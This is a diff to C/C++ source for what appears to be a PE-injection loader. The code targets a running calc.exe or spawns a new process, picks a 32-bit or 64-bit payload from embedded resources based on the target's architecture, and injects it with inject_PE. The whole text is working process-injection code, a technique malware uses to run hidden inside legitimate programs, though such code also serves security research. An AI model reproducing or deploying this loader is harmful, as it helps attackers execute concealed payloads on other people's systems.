@@ -42,35 +42,47 @@ HANDLE make_new_process(HANDLE &mainThread)
     return pi.hProcess;
 }
 
+bool is_process_64b(HANDLE hProcess)
+{
+    if (is_system32b()) {
+        return false;
+    }
+    if (is_wow64(hProcess)) {
+        printf("[*] wow64\n");
+        return false;
+    }
+    printf("[*] not wow64\n");
+    return true;
+}
+
 int main(int argc, char *argv[])
 {
-    BYTE* res_data = NULL;
-    SIZE_T res_size = 0;
-    if (is_compiled_32b()) {
-        printf("payload 32 bit\n");
-        if ((res_data = get_raw_payload(res_size, MY_RESOURCE32)) == NULL) {
-            printf("Failed!\n");
-            return -1;
-        }
-    } else {
-        printf("payload 64 bit\n");
-        if ((res_data = get_raw_payload(res_size, MY_RESOURCE64)) == NULL) {
-            printf("Failed!\n");
-            return -1;
-        }
-    }
-    /*
-    if (!is_compiled_32b()) {
-        printf("[ERROR] Not supported! Compile the loader as a 32 bit application!\n");
-        system("pause");
-        return (-1);
-    }*/
     //we may inject into existing process
     HANDLE hProcess = find_running_process(L"calc.exe");
     HANDLE mainThread = NULL;
     if (!hProcess) {
         //or create a new one:
+        printf("making a new process!\n");
         hProcess = make_new_process(mainThread);
+    }
+
+    bool is64b = is_process_64b(hProcess);
+
+    BYTE* res_data = NULL;
+    SIZE_T res_size = 0;
+    if (!is64b) {
+        printf("payload 32 bit\n");
+        if ((res_data = get_raw_payload(res_size, MY_RESOURCE32)) == NULL) {
+            printf("Failed!\n");
+            return -1;
+        }
+    }
+    else {
+        printf("payload 64 bit\n");
+        if ((res_data = get_raw_payload(res_size, MY_RESOURCE64)) == NULL) {
+            printf("Failed!\n");
+            return -1;
+        }
     }
     if (inject_PE(hProcess, res_data, res_size)) {
         printf("Injected!\n");
